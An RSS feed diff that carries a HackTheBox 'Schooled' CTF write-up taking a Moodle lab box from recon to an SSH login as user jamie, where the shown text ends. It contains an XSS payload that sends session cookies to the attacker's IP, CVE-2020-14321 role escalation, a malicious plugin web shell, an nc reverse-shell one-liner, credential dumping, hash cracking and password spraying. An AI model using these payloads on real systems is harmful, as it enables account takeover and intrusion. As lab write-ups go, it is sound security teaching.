@@ -8,6 +8,419 @@
     <lastBuildDate>Thu, 16 Sep 2021 18:22:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/pkg/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Schooled</title>
+      <link>https://fahmifj.github.io/hackthebox/schooled/</link>
+      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/schooled/</guid>
+      <description>Moodle exploitation using CVEs</description>
+      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Stealing cookie with XSS</li>
+<li>Moodle exploitation</li>
+<li>Sudo exploitation on <code>pkg</code></li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.234
+Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+Reason: <span class="m">65532</span> resets
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
+33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
+<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
+<p>Port 80 serving a homepage of a school institution.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
+</p>
+<p>In the About section, it states that this school has an online learning system using Moodle.</p>
+<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
+</p>
+<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
+</p>
+<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
+<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
+</p>
+<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
+</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
+<span class="o">[</span>+<span class="o">]</span> Method:       GET
+<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
+</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
+</code></pre></div><p>And it&rsquo;s different site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
+<span class="m">84</span>
+<span class="m">20750</span>
+</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
+<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
+<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
+</p>
+<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
+<h4 id="account-register">Account Register</h4>
+<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
+</p>
+<p>I will change my email domain and login afterwards.</p>
+<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
+<h4 id="enroll-course">Enroll course</h4>
+<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
+<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
+</p>
+<p>On the Mathematics course, there are two announcements .</p>
+<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
+</p>
+<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
+<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
+</p>
+<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
+<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
+</p>
+<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
+<h4 id="exploit-db">Exploit-DB</h4>
+<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
+<ul>
+<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
+<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
+</ul>
+<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
+</p>
+<h4 id="moodle-security">Moodle Security</h4>
+<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
+<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
+</p>
+<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
+<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
+<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
+<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
+<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>Or this one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
+</p>
+<p>After a few minutes, there is a request coming to my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ nc -nvlp <span class="m">80</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
+GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
+Host: 10.10.14.49
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
+</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
+<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
+</p>
+<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
+<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
+</p>
+<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
+</p>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
+<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
+<p>The first step is to join a teacher to my course.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
+</p>
+<p>I will choose Jamie Borham and enroll it to my course.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
+</p>
+<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
+<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
+</p>
+<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
+<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
+</p>
+<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
+<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
+</p>
+<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
+</p>
+<h4 id="malicious-plugin">Malicious Plugin</h4>
+<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
+<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
+<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
+</p>
+<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
+</p>
+<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
+</p>
+<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
+</p>
+<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
+</p>
+<p>I will just continue on the installation process.</p>
+<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
+</p>
+<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
+</code></pre></div><p>On my listener:</p>
+<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
+</p>
+<p>I will upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
+$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+$ which stty
+which stty
+/bin/stty
+$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
+→ root@kali «exploits» «10.10.14.49» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>
+
+$ ls -l
+total <span class="m">0</span>
+$ ls -la
+total <span class="m">0</span>
+$ <span class="nb">pwd</span>
+/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-jamie">Shell as jamie</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
+jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
+steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
+$ ls -l /home/
+total <span class="m">17</span>
+drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
+drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
+</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
+&lt;?php  // Moodle configuration file
+
+unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
+global <span class="nv">$CFG</span><span class="p">;</span>
+<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
+  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
+  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
+<span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
+
+require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+</code></pre></div><h4 id="mysql">MySQL</h4>
+<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
+mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+Your MySQL connection id is <span class="m">7517</span>
+Server version: 8.0.23 Source distribution
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
+<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
+<h4 id="hash-crack">Hash crack</h4>
+<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
+Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
+Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
+Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="password-spray">Password Spray</h4>
+<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+</code></pre></div><h4 id="ssh">SSH</h4>
+<p>Now I can login as jamie via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «schooled» «10.10.14.49» 
+$ ssh jamie@10.10.10.234
+Password <span class="k">for</span> jamie@Schooled:
+Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
+FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+jamie@Schooled:~ $ id
